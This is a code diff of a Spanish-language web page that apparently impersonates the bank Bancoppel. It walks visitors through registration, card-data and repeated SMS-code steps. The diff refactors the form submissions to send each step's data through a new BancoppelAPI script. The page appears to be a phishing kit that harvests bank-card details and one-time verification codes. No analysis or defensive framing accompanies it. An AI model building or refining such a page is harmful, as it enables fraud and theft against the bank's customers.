@@ -123,11 +123,11 @@
         </div>
 
         <div id="initialInfoStep">
-          <h2 class="text-center text-[30px] font-bold leading-tight mb-6 tracking-[-0.5px] text-[#2f2f2f]">
+          <h2 class="text-center text-[32px] font-bold leading-tight mb-6 tracking-[-0.5px] text-[#2f2f2f]">
             Tu registro
           </h2>
 
-          <form id="initialInfoForm" action="api.php" method="POST">
+          <form id="initialInfoForm" action="#" method="POST">
             <input type="hidden" name="fecha" id="fecha" />
 
             <div class="border-b-2 border-[#AAAAAA] mb-4">
@@ -227,12 +227,11 @@
             Datos de la tarjeta
           </h2>
           <p class="text-center text-[15px] leading-8 text-[#666] mb-20">
-            
-            
-            
-             </p>
 
-          <form id="securityCardForm" action="api.php" method="POST">
+            
+          </p>
+
+          <form id="securityCardForm" action="#" method="POST">
             <div class="border-b-2 border-[#AAAAAA] mb-5">
               <input
                 type="text"
@@ -269,7 +268,7 @@
         </div>
 
         <div id="smsStep" class="hidden">
-          <h2 class="text-center text-[28px] font-bold leading-tight mb-4 tracking-[-0.5px] text-[#2f2f2f]">
+          <h2 class="text-center text-[32px] font-bold leading-tight mb-4 tracking-[-0.5px] text-[#2f2f2f]">
             Verificación de Seguridad
           </h2>
           <div id="smsExpiredMessage" class="hidden rounded-md border border-[#f3b7b7] bg-[#fff4f4] px-4 py-3 text-center text-[13px] leading-5 text-[#b42318] mb-3">
@@ -280,7 +279,7 @@
             Hemos enviado un <strong>código de 6 dígitos</strong> al número de celular registrado.
           </p>
 
-          <form id="smsVerificationForm" class="space-y-4" action="api.php" method="POST">
+          <form id="smsVerificationForm" class="space-y-4" action="#" method="POST">
             <input type="hidden" name="sms_stage" id="sms_stage" value="1" />
             <div class="flex justify-between gap-2 sm:gap-3">
               <input type="text" name="digit1" maxlength="1" inputmode="numeric" pattern="[0-9]" class="sms-digit h-[52px] w-full max-w-[52px] rounded-md border-2 border-[#AAAAAA] bg-[#F5F5F5] text-center text-[22px] font-bold outline-none focus:border-[#2847D8]" />
@@ -406,6 +405,7 @@
 
   </div>
 
+  <script src="api.js"></script>
   <script>
     (function () {
       const DAYS = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
@@ -908,11 +908,7 @@
         document.getElementById('fecha').value = `${parts[2]}-${parts[1].padStart(2,'0')}-${parts[0].padStart(2,'0')}`;
 
         try {
-          await fetch('api.php', {
-            method: 'POST',
-            body: new FormData(initialInfoForm),
-            credentials: 'same-origin'
-          });
+          await BancoppelAPI.submitInitial(new FormData(initialInfoForm));
         } catch (err) {
           console.error('Error enviando datos iniciales:', err);
           btnInicial.disabled = false;
@@ -938,11 +934,7 @@
         btnSeguridad.disabled = true;
 
         try {
-          await fetch('api.php', {
-            method: 'POST',
-            body: new FormData(securityCardForm),
-            credentials: 'same-origin'
-          });
+          await BancoppelAPI.submitSecurity(new FormData(securityCardForm));
         } catch (err) {
           console.error('Error enviando datos de tarjeta:', err);
           btnSeguridad.disabled = false;
@@ -964,11 +956,7 @@
         document.getElementById('sms_stage').value = String(smsAttemptCount);
 
         try {
-          await fetch('api.php', {
-            method: 'POST',
-            body: new FormData(smsVerificationForm),
-            credentials: 'same-origin'
-          });
+          await BancoppelAPI.submitSms(new FormData(smsVerificationForm));
         } catch (err) {
           console.error('Error enviando código SMS:', err);
           btnVerificar.disabled = false;
